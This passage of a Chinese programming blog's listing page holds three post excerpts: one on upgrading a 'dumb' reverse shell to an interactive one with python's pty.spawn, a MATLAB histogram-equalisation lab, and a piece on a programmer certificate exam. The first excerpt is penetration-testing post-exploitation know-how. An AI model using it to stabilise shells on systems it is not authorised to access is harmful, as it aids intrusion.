shell也可以运行在另外一种模式：非交互式模式，以shell script(非交互)方式执行。在这种模式 下，shell不与你进行交互，而是读取存放在文件中的命令,并且执行它们。当它读到文件的结尾EOF，shell也就终止了。
通过上述命令反弹shell得到的shell并不能称为完全交互的shell，通常称之为“哑”shell。
通常存在以下缺点：
1.ctrl-c会中断会话；
2.无法正常使用vim等文本编辑器；
3.没有向上箭头使用历史；
4.无法执行交互式命令；
5.无法查看错误输出；
6.无法使用 tab 命令补全；
7.无法操控jobcontrol。
**因此有必要去获取一个完全交互的shell，**方法就是在shell 中执行python，使用pty模块，创建一个原生的终端。下面提供两条命令，主要是因为有的机器可能是python2，有的是3，我这里是python2。
python3 -c 'import pty; pty.spawn("/bin/bash")' python -c 'import pty; pty.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/941b4b97e131b71a3b84190d4ca5936c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1f180cbef591a0099e7e8886d15bbef7/" rel="bookmark">
			【数字图像处理】实验三 图像增强2
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		实验三 图像增强2 1 实验目的2 实验环境3 实验内容4 实验心得 1 实验目的 理解并掌握直方图均衡化实现图像增强。掌握傅里叶变换和离散余弦变换。 2 实验环境 matlab
3 实验内容 1、对一幅低对比度分辨率的图像采用直方图均衡化方法实现图像增强，分别采用系统函数和自己编写函数实现相应用功能。
使用系统函数 % lab311.m close all; clear; clc; I=imread('lab3.jpeg');%读取图像 I=rgb2gray(I); J=histeq(I);%将灰度拉伸，使图像不会显得那么黑，有了更好的对比度 figure('NumberTitle','off','name','直方图均衡化（系统函数）'); %显示各图像 subplot(2,2,1); imshow(I); title('原始图像','FontName','宋体'); subplot(2,2,2); imhist(I); title('灰度直方图','FontName','宋体'); ylim('auto'); subplot(2,2,3); imshow(J); title('直方图均衡化（系统函数）','FontName','宋体'); subplot(2,2,4); imhist(J); title('灰度直方图','FontName','宋体'); ylim('auto'); 使用自定义函数 %（1）lab312.m close all; clear; clc; I=imread('lab3.jpeg');%读取图像 I=rgb2gray(I); J=histSYX(I); figure('NumberTitle','off','name','直方图均衡化（自定义函数）'); %显示各图像 subplot(2,2,1); imshow(I); title('原始图像','FontName','宋体'); subplot(2,2,2); imhist(I); title('灰度直方图','FontName','宋体'); ylim('auto'); subplot(2,2,3); imshow(J); title('直方图均衡化（自定义函数）','FontName','宋体'); subplot(2,2,4); imhist(J); title('灰度直方图','FontName','宋体'); ylim('auto'); （2）自定义直方图均衡化histSYX.m function J=histSYX(I) [width,height]=size(I); count=width*height;	%像素总数 % J=zeros(width,height); J=I; n=256;%灰度级 H=zeros(1,n); for row=1:width for col=1:height k=I(row,col);	%该像素灰度值rk H(k+1)=H(k+1)+1;	%统计各灰度级pixel总数nk end end pr=H.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1f180cbef591a0099e7e8886d15bbef7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f56ca1670ec3df3fdbe8133533b57a9e/" rel="bookmark">
			软考初级程序员含金量高吗？有答案了
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		软考初级的证书含金量相对中级和高级来说都是不高的
随着IT行业的发展，程序员也是现在热门的一个行业，对于想从事程序员这个职业的考生来说，考取程序员证书对于未来的就业竞争也会有一定的优势，而且在考证的过程中，自身的专业知识也得到了相应的巩固，对以后的实践工作也是有一定帮助的。
要通过软考程序员考试并不是很难，程序员属于软考初级考试，因此难度是比较小的，在考前可以多看教程，多做历年真题，帮助备考。
软考程序员考试采用笔试形式，考试实行全国统一大纲、统一试题、统一时间、统一标准、统一证书的考试办法。
程序员包含两个考试科目：计算机与软件工程基本知识和程序设计。可能很多考生会以为程序设计是上机考试，其实两个考试科目都是笔试的形式，只是考试题型有所不同。上午考试题型为客观选择题，下午考试题型为主观问答题，因此下午考试难度可能会更大一点，需要运用理论知识进行实际分析与解答。
程序员考试要求
（1）掌握数制及其转换、数据的机内表示、算术和逻辑运算、应用数学的基础知识；
（2）了解计算机的组成以及各主要部件性能指标；
（3）掌握操作系统、程序设计语言的基础知识；
（4）熟练掌握基本数据结构和常用算法；
（5）熟练掌握Ｃ程序设计语言以及Ｃ++、Java中的一种程序设计语言；
（6）熟悉数据库、网络和多媒体的基础知识；
（7）了解软件工程的基础知识、软件过程基本知识、软件开发项目管理的常识；
（8）了解常用信息技术标准、安全性以及有关法律、法规的基础知识；
（9）了解信息化及计算机应用的基础知识；
（10）正确阅读和理解计算机领域的简单英文资料。
软考学习资料需要的同学可留言
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/141/">«</a>
	<span class="pagination__item pagination__item--current">142/220</span>
	<a class="pagination__item pagination__item--next btn" href="/page/143/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程中国的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>